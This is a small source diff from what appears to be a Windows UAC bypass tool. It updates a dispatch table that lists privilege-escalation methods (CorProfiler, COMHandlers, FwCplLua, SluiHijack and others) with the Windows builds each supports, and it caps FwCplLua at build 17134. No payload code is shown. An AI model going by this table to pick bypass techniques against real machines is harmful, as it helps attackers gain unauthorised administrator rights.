@@ -6,7 +6,7 @@
 *
 *  VERSION:     2.87
 *
-*  DATE:        03 Mar 2018
+*  DATE:        02 May 2018
 *
 *  UAC bypass dispatch.
 *
@@ -103,7 +103,7 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodCorProfiler, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodCOMHandlers, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodCMLuaUtil, NULL, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
-    { MethodFwCplLua, NULL, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
+    { MethodFwCplLua, NULL, { 7600, 17134 }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
     { MethodDccwCOM, NULL, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
     { MethodVolatileEnv, NULL, { 7600, 16229 }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodSluiHijack, NULL, { 9600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
